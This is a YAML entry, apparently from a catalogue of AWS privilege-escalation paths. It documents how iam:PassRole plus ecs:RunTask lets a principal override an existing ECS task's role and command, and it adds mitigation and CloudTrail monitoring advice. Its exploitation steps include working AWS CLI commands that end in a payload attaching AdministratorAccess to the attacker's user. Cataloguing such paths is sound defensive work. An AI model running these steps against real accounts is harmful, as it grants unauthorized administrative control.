id: ecs-008
name: iam:PassRole + ecs:RunTask
category: new-passrole
services:
  - iam
  - ecs

permissions:
  required:
    - permission: iam:PassRole
      resourceConstraints: Must cover both the task role ARN (for the taskRoleArn override) and the execution role ARN defined in the existing task definition — ECS requires PassRole on the execution role even when it is not being changed
    - permission: ecs:RunTask
      resourceConstraints: Must have permission to run tasks in the target cluster; an existing task definition must be available to override
  additional:
    - permission: ecs:ListClusters
      resourceConstraints: Helpful for discovering available ECS clusters
    - permission: ecs:ListTaskDefinitions
      resourceConstraints: Helpful for discovering existing task definitions to exploit with overrides
    - permission: ecs:DescribeTasks
      resourceConstraints: Helpful for monitoring task execution status
    - permission: ec2:DescribeVpcs
      resourceConstraints: Helpful for finding the default VPC for Fargate network configuration
    - permission: ec2:DescribeSubnets
      resourceConstraints: Helpful for finding subnets for Fargate network configuration

description: A principal with `iam:PassRole` and `ecs:RunTask` can override an existing ECS task definition's container command and task role at runtime using the `--overrides` parameter — without needing `ecs:RegisterTaskDefinition`. By overriding the `taskRoleArn` with a privileged role (passed via `iam:PassRole`) and the container command with a malicious payload, the attacker causes the Fargate task to execute arbitrary code with the permissions of the passed role. This is a lower-permission variant of ECS-004, removing the requirement for `ecs:RegisterTaskDefinition` by hijacking an existing task definition instead of creating a new one.

prerequisites:
  admin:
    - An ECS cluster must exist in the account
    - An existing task definition must be available in the cluster (no ecs:RegisterTaskDefinition required)
    - A role must exist that trusts ecs-tasks.amazonaws.com with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - A subnet must be available for Fargate launch type network configuration
  lateral:
    - An ECS cluster must exist in the account
    - An existing task definition must be available in the cluster
    - A role must exist that trusts ecs-tasks.amazonaws.com
    - A subnet must be available for Fargate launch type network configuration

exploitationSteps:
  awscli:
    - step: 1
      command: aws sts get-caller-identity
      description: Get your account ID and verify identity before proceeding
    - step: 2
      command: |
        aws ecs list-clusters \
          --query 'clusterArns' \
          --output json
      description: Discover available ECS clusters in the account
    - step: 3
      command: |
        aws ecs list-task-definitions \
          --query 'taskDefinitionArns' \
          --output json
      description: Discover existing task definitions — select one to hijack with the --overrides parameter (no new task definition registration required)
    - step: 4
      command: |
        aws ec2 describe-vpcs --filters "Name=isDefault,Values=true" --query 'Vpcs[0].VpcId' --output text
        aws ec2 describe-subnets \
          --filters "Name=vpc-id,Values=VPC_ID" \
          --query 'Subnets[0].SubnetId' \
          --output text
      description: Find the default VPC and subnet ID for Fargate network configuration
    - step: 5
      command: |
        aws ecs run-task \
          --cluster CLUSTER_NAME \
          --task-definition EXISTING_TASK_DEFINITION \
          --launch-type FARGATE \
          --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}" \
          --overrides '{
            "taskRoleArn": "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
            "containerOverrides": [{
              "name": "CONTAINER_NAME",
              "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
            }]
          }'
      description: Run the existing task definition on Fargate, overriding the task role ARN via iam:PassRole and the container command with a payload that escalates the starting principal's privileges
    - step: 6
      command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
      description: Monitor task status until it reaches STOPPED state, then verify privilege escalation was successful

recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative task roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```


  - Monitor CloudTrail for `ecs:RunTask` calls with a `taskRoleArn` in the `overrides` field — this is the specific API pattern that enables this attack
  - Monitor CloudTrail for ECS task execution by principals who do not usually run tasks
  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
  - Monitor and alert on ECS task execution with privileged roles
  - Regularly audit ECS task definitions for overly permissive defaults — if existing task definitions can be run with any role via overrides, that is the attack surface
  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access

limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.

  This path requires an existing task definition in the cluster. The `--overrides` parameter allows overriding the `taskRoleArn` and container commands at runtime without creating a new task definition. This path uses the Fargate launch type and does not require an EC2 container instance — see ECS-009 for the EC2 launch type equivalent.

